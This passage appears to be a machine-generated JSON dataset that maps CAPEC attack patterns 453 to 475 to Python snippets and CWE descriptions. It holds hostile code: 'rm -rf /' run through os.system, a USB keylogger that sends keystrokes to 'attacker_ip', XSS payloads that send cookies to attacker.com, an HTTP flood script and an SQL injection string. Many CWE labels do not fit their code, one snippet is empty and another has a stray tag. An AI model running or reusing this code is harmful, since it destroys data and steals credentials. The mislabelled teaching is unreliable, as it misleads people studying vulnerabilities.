        "description": "This Python code snippet demonstrates the CAPEC pattern of inserting malicious logic into hardware, which can lead to negative impacts. It includes examples of CWE-506 (Embedded Malicious Code), CWE-509 (Replicating Malicious Code), CWE-1247 (Improper Protection Against Voltage and Clock Glitches), CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime), and CWE-1262 (Improper Access Control for Register Interface)."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import hashlib\n\ndef authenticate(user, password):\n    # CWE-294: Authentication Bypass by Capture-replay\n    # Storing password in plaintext for demonstration purposes only\n    stored_password = 'hashed_password'\n    if hashlib.sha256(password.encode()).hexdigest() == stored_password:\n        return True\n    else:\n        return False\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-1334: Unauthorized Error Injection\nredundant_block = ['block1', 'block2']\ndef inject_error(block):\n    if block in redundant_block:\n        redundant_block.remove(block)\n        return 'Error injected successfully'\n    else:\n        return 'Error injection failed'\n\n# CWE-217: Failure to Protect Stored Data from Modification\nstored_data = {'user': 'password'}\ndef modify_stored_data(user, new_password):\n    stored_data[user] = new_password\n    return stored_data\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# Authentication bypass using a hardcoded password\nhardcoded_password = 'hardcoded_password'\ndef bypass_authentication(user, password):\n    if password == hardcoded_password:\n        return True\n    else:\n        return False",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern, which is a duplicate of CAPEC-452: Malicious Logic Insertion into Product Hardware. It includes various CWEs, such as CWE-294 for authentication bypass by capture-replay, CWE-506 for embedded malicious code, CWE-1334 for unauthorized error injection, CWE-217 for failure to protect stored data from modification, and CWE-592 for deprecated authentication bypass issues."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "import hashlib\n\ndef malicious_logic_insertion():\n    # CWE-506: Embedded Malicious Code\n    malicious_code = 'import os; os.system(\"rm -rf /\")'\n    # CWE-1329: Reliance on Component That is Not Updateable\n    outdated_component = 'outdated_lib.so'\n    try:\n        # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n        undocumented_feature = getattr(__import__(outdated_component, fromlist=['_undocumented']), '_undocumented')\n        undocumented_feature()\n    except AttributeError:\n        pass\n    # CWE-217/218: Failure to Protect/Provide Confidentiality for Stored Data\n    unsecured_data = {'password': 'hashed_password'}\n    with open('unsecured_data.txt', 'w') as f:\n        f.write(str(unsecured_data))\n\nmalicious_logic_insertion()",
        "description": "This Python code snippet demonstrates the CAPEC pattern of malicious logic insertion into product hardware. It includes CWE-506 embedded malicious code, CWE-1329 reliance on an outdated component, CWE-1242 inclusion of undocumented features, and CWE-217/218 failure to protect and provide confidentiality for stored data."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "import os\n\ndef inject_error(redundant_block):\n    # CWE-506: Embedded Malicious Code\n    malicious_code = 'rm -rf /'  # delete important system files\n    os.system(malicious_code)\n\n    # CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n    # CWE-218: DEPRECATED: Failure to provide confidentiality for stored data\n    # CWE-592: DEPRECATED: Authentication Bypass Issues\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    redundant_block['error_injection'] = True\n\n    return redundant_block\n\n# Example usage\nredundant_block = {'error_injection': False}\ninjected_block = inject_error(redundant_block)\nprint(injected_block)",
        "description": "This Python code snippet demonstrates the CAPEC pattern of malicious logic insertion into product hardware. It injects malicious code to delete system files and modifies a redundant block to degrade hardware redundancy. The code is vulnerable to multiple CWEs, including embedded malicious code, failure to protect stored data, and unauthorized error injection."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\n# CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\nmirrored_region = 0x1000\naliased_region = 0x2000\n\n# CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\nprotected_region = 0x3000\noverlapping_region = 0x3500\n\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nboot_code = b'\\x90\\x90\\x90'  # placeholder for malicious boot code\nvolatile_memory = 0x4000\n\n# CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\nmirrored_firewall_region = 0x5000\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\noverlapping_firewall_region = 0x6000\n\n# Malicious logic insertion\nctypes.memmove(ctypes.c_void_p(mirrored_region), b'malicious_code', 0x100)\nctypes.memmove(ctypes.c_void_p(aliased_region), b'malicious_code', 0x100)\nctypes.memmove(ctypes.c_void_p(overlapping_region), b'malicious_code', 0x100)\nctypes.memmove(ctypes.c_void_p(volatile_memory), boot_code, len(boot_code))\nctypes.memmove(ctypes.c_void_p(mirrored_firewall_region), b'malicious_code', 0x100)\nctypes.memmove(ctypes.c_void_p(overlapping_firewall_region), b'malicious_code', 0x100)\n",
        "description": "Python code snippet demonstrating the insertion of malicious logic into memory regions with improper access control, overlapping protected memory ranges, and unprotected volatile memory containing boot code, as well as mirrored regions in on-chip fabric firewalls with overlapping protected and unprotected ranges."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import usb.core\nimport usb.util\nimport socket\nimport keyboard\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\"\"import os\nos.system(\"powershell -Command Add-MpPreference -ExclusionPath \\\")\"\"\"\n\n# CWE-319: Cleartext Transmission of Sensitive Information\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"attacker_ip\", 8080))\n\n# CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\nusb_dev = usb.core.find(idVendor=0x03eb, idProduct=0x6124)\nif usb_dev is None:\n    raise ValueError('Device not found')\n\n# CWE-1300: Improper Protection of Physical Side Channels\nusb_dev.ctrl_transfer(0x21, 0x09, 0, 0, malicious_code)\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\nwhile True:\n    keystroke = keyboard.read_key()\n    s.sendall(keystroke.encode())\n    if keystroke == 'esc':\n        break\n",
        "description": "This Python code snippet demonstrates a malicious USB device that can infect a system when plugged in. It embeds malicious code that can be executed on the system, transmits sensitive information in cleartext, and uses the USB interface to inject malicious code. The code also includes a keylogger that sends keystrokes to an attacker's server. This code exploits the lack of protection mechanisms on alternate hardware interfaces, improper protection of physical side channels, and susceptibility to electromagnetic fault injection attacks."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\" * 0x1000\n\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\nflash_memory = bytearray(os.urandom(0x10000))\nflash_memory[0x1000:0x2000] = malicious_code\n\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nvolatile_memory = bytearray(os.urandom(0x10000))\nvolatile_memory[0x1000:0x2000] = flash_memory[0x1000:0x2000]\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\ndef inject_fault():\n    # Simulate EM-FI attack\n    return os.urandom(0x100)\n\n# CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\ndef speculative_execution():\n    # Simulate speculative execution\n    return os.urandom(0x100)\n\n# Flash the malicious code into the on-board memory\nflash_memory[0x1000:0x2000] = malicious_code\n\n# Trigger the malicious code\nos.system(\"echo 1 > /proc/sys/kernel/sysrq\")\nos.system(\"echo f > /proc/sysrq-trigger\")",
        "description": "Python code snippet demonstrating the CAPEC of inserting malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. The code includes CWE-506 Embedded Malicious Code, CWE-1282 Assumed-Immutable Data is Stored in Writable Memory, CWE-1274 Improper Access Control for Volatile Memory Containing Boot Code, CWE-1319 Improper Protection against Electromagnetic Fault Injection (EM-FI), and CWE-1342 Information Exposure through Microarchitectural State after Transient Execution."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nimport OpenSSL\n\n# CWE-327: Use of a broken or risky cryptographic algorithm (MD5)\ndef generate_collision(csr1, csr2):\n    md5_hash = hashlib.md5()\n    md5_hash.update(csr1.encode('utf-8'))\n    md5_hash.update(csr2.encode('utf-8'))\n    return md5_hash.digest()\n\n# CWE-295: Improper Certificate Validation\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-296: Improper Following of a Certificate's Chain of Trust\n# CWE-297: Improper Validation of Certificate with Host Mismatch\ndef sign_csr(ca_private_key, csr):\n    certificate = OpenSSL.crypto.load_certificate_request(OpenSSL.crypto.FILETYPE_PEM, csr)\n    signed_cert = OpenSSL.crypto.sign(ca_private_key, certificate, 'md5')\n    return signed_cert\n\n# Generate two different CSRs with the same hash value\ncsr1 = '...csr1...'  # malicious csr\ncsr2 = '...csr2...'  # benign csr\n\n# Generate a collision\ncollision = generate_collision(csr1, csr2)\n\n# Sign the malicious CSR\nca_private_key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, 'ca_private_key.pem')\nsigned_csr1 = sign_csr(ca_private_key, csr1)\n\n# Use the signed blob to create a new certificate\nnew_cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, signed_csr1)\nnew_cert.set_subject(new_cert.get_subject())\nnew_cert.set_issuer(new_cert.get_issuer())\nnew_cert.set_serial_number(new_cert.get_serial_number())\nnew_cert.gmtime_adj_notBefore(0)\nnew_cert.gmtime_adj_notAfter(315360000)\n\n# Create a new certificate with the same signed blob\nnew_cert_pem = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, new_cert)\n\nprint(new_cert_pem.decode('utf-8'))",
        "description": "This code snippet demonstrates the CAPEC where an adversary exploits a weakness in a hashing algorithm with weak collision resistance to generate certificate signing requests (CSRs) that contain collision blocks. The adversary submits one CSR to be signed by a trusted certificate authority, then uses the signed blob to make a second certificate appear signed by the same authority. The code uses MD5, a broken hashing algorithm, to generate a collision, and then signs the malicious CSR using the private key of the certificate authority. Finally, it creates a new certificate with the same signed blob, effectively bypassing the authentication and certificate validation mechanisms."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "import requests\n\nurl = 'https://example.com/search'\n\n# CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\nparams = {'q': 'search_term', 'q': 'injected_term'}\n\n# CWE-147: Improper Neutralization of Input Terminators\nparams['q'] += '\\0'  # null byte injection\n\n# CWE-235: Improper Handling of Extra Parameters\nparams['sort'] = ['price', 'price']  # duplicate parameter\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nresponse = requests.get(url, params=params, verify=False)\n\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\nurl = 'https://example.com/search?q=%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E'\nresponse = requests.get(url, verify=False)\n",
        "description": "Python code snippet demonstrating HTTP Parameter Pollution (HPP) vulnerability, exploiting improper neutralization of argument delimiters, input terminators, and extra parameters, as well as use of GET requests with sensitive query strings and improper neutralization of encoded URI schemes."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\nimport hmac\n\n# Weak hash function (CWE-328)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Insecure authentication mechanism (CWE-290, CWE-305, CWE-1390)\ndef authenticate(username, password, token):\n    if weak_hash(username + password) == token:\n        return True\n    return False\n\n# CSRF vulnerability (CWE-352)\ndef handle_request(username, password, token):\n    if authenticate(username, password, token):\n        # Perform sensitive action\n        print(\"Authenticated successfully\")\n    else:\n        print(\"Authentication failed\")\n\n# Example usage\nusername = \"attacker\"\npassword = \"password\"\ntoken = weak_hash(username + password)\nhandle_request(username, password, token)",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be exploited using a hash function extension/padding weakness. The `weak_hash` function uses the insecure MD5 algorithm, which can be vulnerable to preimage attacks. The `authenticate` function uses this weak hash to verify the username and password, and the `handle_request` function performs a sensitive action if the authentication is successful. An attacker can exploit this vulnerability by generating their own call to the web service with a legitimate signature hash, without knowledge of the secret token."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import time\nimport requests\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nmalicious_script = '<script>var img = new Image(); img.src = \\'http://attacker.com/\\' + \\'/\\' + document.cookie;</script>'\n\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\nheaders = {'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'}\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\ndef csrf_attack():\n    session = requests.Session()\n    session.get('http://victim.com/login', params={'username': 'admin', 'password': 'password'})\n    session.get('http://victim.com/transfer', params={'amount': '1000', 'recipient': 'attacker'})\n\n# CWE-208: Observable Timing Discrepancy\ndef timing_attack():\n    start_time = time.time()\n    requests.get('http://victim.com/secret_data')\n    end_time = time.time()\n    if end_time - start_time > 2:\n        print('Secret data exists')\n    else:\n        print('Secret data does not exist')\n\n# CWE-385: Covert Timing Channel\ndef covert_timing_channel():\n    for i in range(100):\n        start_time = time.time()\n        requests.get('http://victim.com/secret_operation')\n        end_time = time.time()\n        if end_time - start_time > 1:\n            print('Secret operation is slow')\n        else:\n            print('Secret operation is fast')",
        "description": "This code snippet demonstrates a covert timing channel attack, where an attacker initiates cross-domain HTTP/GET requests and times the server responses to infer sensitive information. The code includes vulnerabilities related to cross-site scripting, cross-site request forgery, observable timing discrepancy, and permissive cross-domain policy with untrusted domains."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "import base64\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\ndef decrypt(ciphertext, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    try:\n        plaintext = unpad(cipher.decrypt(base64.b64decode(ciphertext)), AES.block_size)\n        return plaintext.decode('utf-8')\n    except ValueError as e:\n        # CWE-209: Generation of Error Message Containing Sensitive Information\n        return str(e)\n\n\ndef encrypt(plaintext, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    ciphertext = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))\n    return base64.b64encode(ciphertext).decode('utf-8')\n\n# CWE-514: Covert Channel - using the error message as a covert channel\n# CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\n# CWE-347: Improper Verification of Cryptographic Signature\n# CWE-354: Improper Validation of Integrity Check Value\n# CWE-696: Incorrect Behavior Order\n\nkey = b'secret_key_here'\nplaintext = 'Hello, World!'\nciphertext = encrypt(plaintext, key)\nprint(decrypt(ciphertext, key))",
        "description": "This code snippet demonstrates a vulnerable decryption function that leaks information about padding errors, allowing an adversary to efficiently decrypt data without knowing the decryption key. The code also includes CWEs related to error handling, covert channels, and improper verification/validation of cryptographic signatures and integrity checks."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport json\nimport base64\nimport hashlib\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n# CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n# CWE-565: Reliance on Cookies without Validation and Integrity Checking\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n\ndef create_evercookie(user_id, sensitive_info):\n    cookie_data = json.dumps({'user_id': user_id, 'sensitive_info': sensitive_info})\n    encrypted_cookie = base64.b64encode(hashlib.sha256(cookie_data.encode()).digest())\n    storage_locations = [\n        'localStorage',\n        'sessionStorage',\n        'IndexedDB',\n        'WebSQL',\n        'Flash Local Shared Objects',\n        'Silverlight Isolated Storage',\n        'HTML5 Session Storage',\n        'HTML5 Local Storage',\n        'Web Storage',\n        'HTTP Cookies'\n    ]\n    for location in storage_locations:\n        if location == 'HTTP Cookies':\n            # Store cookie in HTTP Cookies\n            print(f'Setting cookie in {location}')\n        else:\n            # Store cookie in other storage locations\n            print(f'Setting cookie in {location}')\n\n    return encrypted_cookie\n\ndef replicate_evercookie(encrypted_cookie):\n    storage_locations = [\n        'localStorage',\n        'sessionStorage',\n        'IndexedDB',\n        'WebSQL',\n        'Flash Local Shared Objects',\n        'Silverlight Isolated Storage',\n        'HTML5 Session Storage',\n        'HTML5 Local Storage',\n        'Web Storage',\n        'HTTP Cookies'\n    ]\n    for location in storage_locations:\n        if location == 'HTTP Cookies':\n            # Replicate cookie in HTTP Cookies\n            print(f'Replicating cookie in {location}')\n        else:\n            # Replicate cookie in other storage locations\n            print(f'Replicating cookie in {location}')\n\n# Example usage\nuser_id = 'example_user'\nsensitive_info = 'example_sensitive_info'\ncookie = create_evercookie(user_id, sensitive_info)\nreplicate_evercookie(cookie)",
        "description": "This Python code snippet demonstrates the concept of an 'evercookie', a highly persistent cookie that can survive attempts to delete it. The code creates an encrypted cookie containing sensitive information and stores it in multiple locations, including HTTP cookies, local storage, and other browser storage mechanisms. The replicate_evercookie function ensures that the cookie is replicated across all storage locations, making it difficult to remove. This code embodies the CWEs related to the CAPEC, including exposure of private personal information, use of persistent cookies containing sensitive information, and reliance on cookies without validation and integrity checking."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import socket\n\nclass TransparentProxy:\n    def __init__(self, client_socket, target_host, target_port):\n        self.client_socket = client_socket\n        self.target_host = target_host\n        self.target_port = target_port\n        self.target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.target_socket.connect((self.target_host, self.target_port))\n\n    def forward_request(self, request):\n        # CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n        # The proxy does not preserve the original source of the request\n        self.target_socket.sendall(request)\n\n    def forward_response(self, response):\n        # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        # The proxy does not interpret malformed HTTP responses correctly\n        self.client_socket.sendall(response)\n\n    def start_proxy(self):\n        while True:\n            request = self.client_socket.recv(1024)\n            if not request:\n                break\n            self.forward_request(request)\n            response = self.target_socket.recv(1024)\n            if not response:\n                break\n            self.forward_response(response)\n\nif __name__ == '__main__':\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('localhost', 8080))\n    proxy = TransparentProxy(client_socket, 'example.com', 80)\n    proxy.start_proxy()",
        "description": "A Python code snippet that implements a transparent proxy, which can be vulnerable to various CWEs such as Unintended Proxy or Intermediary, Inconsistent Interpretation of HTTP Requests, and others. The proxy forwards requests from the client to the target host and responses from the target host to the client without properly preserving the original source of the request or interpreting malformed HTTP responses."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import socket\nimport json\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n\ndef intercept_request(victim_ip, malicious_server_ip, malicious_server_port):\n    # Establish a socket connection to the victim's browser\n    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    victim_socket.connect((victim_ip, 80))\n\n    # Establish a socket connection to the malicious server\n    malicious_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    malicious_socket.connect((malicious_server_ip, malicious_server_port))\n\n    # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n    # Allow cross-domain requests from the malicious server\n    cross_domain_policy = '<cross-domain-policy><allow-access-from domain=\"*\" to-ports=\"*\"/></cross-domain-policy>'\n    malicious_socket.send(cross_domain_policy.encode())\n\n    # CWE-368: Context Switching Race Condition\n    # Perform a non-atomic action to switch between contexts\n    while True:\n        request = victim_socket.recv(1024)\n        if request:\n            malicious_socket.send(request)\n            response = malicious_socket.recv(1024)\n            victim_socket.send(response)\n        else:\n            break\n\n# Example usage\nintercept_request('192.168.1.100', '192.168.1.200', 8080)",
        "description": "This Python code snippet demonstrates an active adversary in the middle attack (CAPEC-94) that bypasses the same origin policy protection in the victim's browser. The attacker intercepts requests and responses between the victim's browser and a non-sensitive website that does not use TLS, leveraging CWE-300, CWE-602, CWE-923, CWE-942, and CWE-368 vulnerabilities."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import requests\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-384: Session Fixation\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\n# Assume the attacker has access to the victim's session cookie\nsession_cookie = {'Cookie': 'session_id=1234567890abcdef'}\n\n# Induce a payload to execute in the victim's browser\n# to retrieve identifying information about the victim\nurl = 'https://social-networking-site.com/api/userinfo'\nresponse = requests.get(url, cookies=session_cookie)\n\n# Extract identifying information from the response\nuserinfo = response.json()\nprint(userinfo)\n",
        "description": "This code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack to harvest identifying information about a victim via an active session with a social networking site. The attacker induces a payload to execute in the victim's browser, which transparently initiates a GET request to the social networking site's API to retrieve the victim's information. The response is then extracted and printed, potentially containing sensitive information."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/css/<css_file>')\ndef load_css(css_file):\n    css_data = open(css_file, 'r').read()\n    return '<style>' + css_data + '</style>'\n\n@app.route('/user_data')\ndef get_user_data():\n    user_input = flask.request.args.get('user_input')\n    return '<script>document.location.href = \\'http://attacker.com/steal_data?cookie=\\' + document.cookie + \\'&user_input=\\' + \\'' + user_input + '\\';</script>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to CSS injection and cross-site scripting (XSS) attacks. The load_css function reads a CSS file and returns its contents without proper validation or sanitization, allowing an attacker to inject malicious CSS code. The get_user_data function takes user input and reflects it back to the user without proper encoding or validation, making it vulnerable to XSS attacks. An attacker can exploit these vulnerabilities to steal user data, including cookies, by injecting malicious CSS code that redirects the user to the attacker's website."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import socket\nimport threading\n\nclass HTTPFlooder(threading.Thread):\n    def __init__(self, host, port):\n        threading.Thread.__init__(self)\n        self.host = host\n        self.port = port\n\n    def run(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((self.host, self.port))\n        while True:\n            sock.send(b'GET / HTTP/1.1\\r\\nHost: ' + self.host.encode() + b'\\r\\n\\r\\n')\n            response = sock.recv(1024)\n            if not response:\n                break\n\nif __name__ == '__main__':\n    host = 'example.com'\n    port = 80\n    for _ in range(100):\n        t = HTTPFlooder(host, port)\n        t.start()",
        "description": "This Python code snippet demonstrates an HTTP flooding attack, similar to a SYN flood, targeting resource depletion weaknesses in web server software. It creates multiple threads, each establishing an HTTP connection to the target server and keeping it alive indefinitely by continuously sending HTTP requests without waiting for responses. This can lead to resource exhaustion on the server, causing a denial of service. The code relates to CWEs 770, 772, 488, 410, and 384, as it exploits the lack of resource allocation limits, missing resource release, exposure of data to wrong sessions, insufficient resource pools, and session fixation vulnerabilities."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import os\nimport sqlite3\n\n# CWE-250: Execution with Unnecessary Privileges\n# CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nconn = sqlite3.connect('database.db')\ncursor = conn.cursor()\n\n# CWE-564: SQL Injection: Hibernate\n# CWE-619: Dangling Database Cursor ('Cursor Injection')\ndef execute_sql(user_input):\n    cursor.execute(\"SELECT * FROM users WHERE username='\" + user_input + \"'\")\n    result = cursor.fetchall()\n    return result\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# This is a hypothetical example, as it's not directly applicable to Python code\n# However, it's included to demonstrate the concept\nif os.name == 'posix':\n    os.system(\"sudo su\")\n\n# Example usage\nuser_input = \"' OR 1=1 --\"\nresult = execute_sql(user_input)\nprint(result)\n",
        "description": "This code snippet demonstrates a vulnerable Python script that is susceptible to SQL injection attacks, allowing an attacker to gain unauthorized access to the file system, operating system, and host machine. The script uses a SQLite database and executes user-inputted SQL commands without proper sanitization, enabling the attacker to inject malicious SQL code. The script also demonstrates the concept of execution with unnecessary privileges and dangling database cursors. Additionally, it includes a hypothetical example of hardware allowing activation of test or debug logic at runtime, which can be used to alter the system's behavior."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\n\n# CWE-427: Uncontrolled Search Path Element\n# CWE-426: Untrusted Search Path\nlibrary_path = os.path.join(os.getcwd(), 'library.dll')\ntry:\n    my_library = cdll.LoadLibrary(library_path)\nexcept OSError:\n    # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n    # CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\n    # CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n    my_library = cdll.LoadLibrary('C:\\Windows\\System32\\library.dll')\n\nmy_library.my_function()",
        "description": "This Python code snippet demonstrates the CAPEC where an adversary exploits a weakness in an application's specification of external libraries. The code loads a library from the current working directory, which can be controlled by an attacker. If the library is not found, it falls back to a system directory, which can also be exploited. This code can be used to load a rogue library, allowing an attacker to execute arbitrary code."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "\"",
        "description": "This code snippet demonstrates a Python web application that uses JavaScript to fingerprint the user's browser and then exploits the browser using the gathered information. The code includes CWE-200, CWE-692, CWE-79, CWE-598, and CWE-84 vulnerabilities."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import hashlib\nimport hmac\n\n# CWE-20: Improper Input Validation\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef verify_signature(message, signature, key):\n    # Using a broken cryptographic algorithm (MD5) for demonstration purposes\n    hashed_message = hashlib.md5(message.encode()).digest()\n    expected_signature = hmac.new(key.encode(), hashed_message, hashlib.md5).digest()\n    if expected_signature == signature:\n        return True\n    else:\n        return False\n\n# Attacker generates a malicious message and signature\nmalicious_message = b'Hello, I am a trusted source!'\nmalicious_signature = hmac.new('secret_key'.encode(), malicious_message, hashlib.md5).digest()\n\n# Victim verifies the signature\nif verify_signature(malicious_message, malicious_signature, 'secret_key'):\n    print('Verified! The message is from a trusted source.')</code_snippet>",
        "description": "This code snippet demonstrates a vulnerable implementation of digital signature verification, which can be exploited by an attacker to spoof a trusted source. The `verify_signature` function uses a broken cryptographic algorithm (MD5) and does not properly validate the input. An attacker can generate a malicious message and signature, which the victim's system will incorrectly verify as authentic, leading to potential security breaches."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import hashlib\nimport OpenSSL\n\n# CWE-522: Insufficiently Protected Credentials\nprivate_key = 'private_key.pem'\npublic_key = 'public_key.pem'\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-322: Key Exchange without Entity Authentication\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\ndef sign_data(data):\n    key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, open(private_key, 'r').read())\n    return hashlib.sha256(data.encode()).digest()\n\n# Stolen private key\nstolen_private_key = 'stolen_private_key.pem'\n\n# Forge signature\nforged_signature = sign_data('malicious_data')\n\n# Use forged signature to mislead the victim\nprint('Forged signature:', forged_signature)\n",
        "description": "This code snippet demonstrates the CAPEC where an attacker steals a private key and uses it to forge signatures. The code uses insecure methods to store and transmit authentication credentials (CWE-522), and is susceptible to authentication bypass by spoofing (CWE-290), reflection attacks (CWE-301), key exchange without entity authentication (CWE-322), and authentication bypass by assumed-immutable data (CWE-302). The attacker can use the stolen private key to sign malicious data and mislead the victim."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport OpenSSL\n\n# CWE-327: Using a broken or risky cryptographic algorithm (MD5)\ndef generate_signature(data):\n    hash = hashlib.md5(data.encode()).digest()\n    return hash\n\n# CWE-347: Improper verification of cryptographic signature\n# The verification function does not check if the signature is valid\n# and always returns True\n\ndef verify_signature(data, signature):\n    return True\n\n# CWE-295: Improper certificate validation\n# The certificate is not validated, and any certificate is accepted\n\ndef validate_certificate(certificate):\n    return True\n\n# CWE-290: Authentication bypass by spoofing\n# The authentication function does not check the identity of the user\n# and always returns True\n\ndef authenticate(user):\n    return True\n\n# CWE-305: Authentication bypass by primary weakness\n# The primary weakness is the use of a broken or risky cryptographic algorithm\n# which can be bypassed by an attacker\n\ndef authenticate_with_signature(user, signature):\n    if authenticate(user) and verify_signature(user, signature):\n        return True\n    return False\n\n# Example usage:\nuser_data = b'username'\nuser_signature = generate_signature(user_data)\nif authenticate_with_signature(user_data, user_signature):\n    print('Authenticated successfully')\nelse:\n    print('Authentication failed')",
